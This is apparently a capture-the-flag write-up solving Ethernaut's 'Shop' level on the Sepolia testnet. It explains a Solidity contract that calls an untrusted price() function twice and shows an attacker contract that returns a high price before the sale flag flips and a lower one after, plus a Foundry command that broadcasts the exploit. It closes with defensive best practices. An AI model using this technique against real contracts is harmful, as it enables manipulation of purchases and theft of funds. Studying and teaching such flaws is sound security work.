# Ethernaut Challenge 21 — Shop

This challenge demonstrates how relying on external contract calls for logic can lead to unexpected behavior.

Instance address:

```
0x54e86C660Ff6A93f95CF65e49BfeF6bE28a430B1
```

---

## 🎯 Goal

Buy the item for **less than the initial price (100)**.

---

## 🔍 Contract analysis

```solidity
function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
        isSold = true;
        price = _buyer.price();
    }
}
````

### Key observations

* The contract calls `price()` on `msg.sender`
* It calls it **twice**
* The result is assumed to be consistent

---

## 🧠 Vulnerability

The contract trusts an **external call**:

```solidity
_buyer.price()
```

But:

* `msg.sender` is a contract we control
* we can return **different values on each call**

### Execution flow

1. First call:

   ```solidity
   _buyer.price() >= price
   ```

   → must return ≥ 100

2. Then:

   ```solidity
   isSold = true;
   ```

3. Second call:

   ```solidity
   price = _buyer.price();
   ```

   → we can now return a **lower value**

---

## 💣 Attack strategy

Return:

* **high price** when `isSold == false`
* **low price** when `isSold == true`

This works because `isSold` changes between the two calls.

---

## 🧪 Attacker contract

To solve the challenge I have implemented the [ShopAttacker.sol](ShopAttacker.sol) contract.

```solidity
function price() external view override returns (uint256) {
    if (!i_shop.isSold()) {
        return i_shop.price() + 20; // pass the check
    } else {
        return i_shop.price() - 20; // lower the final price
    }
}
```

---

## 🚀 Exploit on Sepolia

Execute the exploit script using Foundry:

```bash
forge script script/21-Shop.s.sol --rpc-url sepolia --broadcast
```

---

## 📜 My Transactions

- Attacker Contract Deploy: [0x88f4f69640bfe12152e8da534b1d09e6b13561aa1ce7713853eb28d5d63b3ea1](https://sepolia.etherscan.io/tx/0x88f4f69640bfe12152e8da534b1d09e6b13561aa1ce7713853eb28d5d63b3ea1)
- Exploit Transaction: [0xc1e8a9c89ba6a1fc0b15df10b76c8c529957fd4d890a152db54b13f1f207326f](https://sepolia.etherscan.io/tx/0xc1e8a9c89ba6a1fc0b15df10b76c8c529957fd4d890a152db54b13f1f207326f)

---

## 🛡️ Security takeaway

This challenge highlights a common mistake:

* trusting external contract calls for critical logic
* assuming return values are consistent across calls

### Best practices

* avoid calling external contracts multiple times for the same value
* cache results in local variables
* follow checks-effects-interactions carefully

---

## ✅ Key insight

> External calls can return different values within the same transaction, breaking assumptions about consistency.






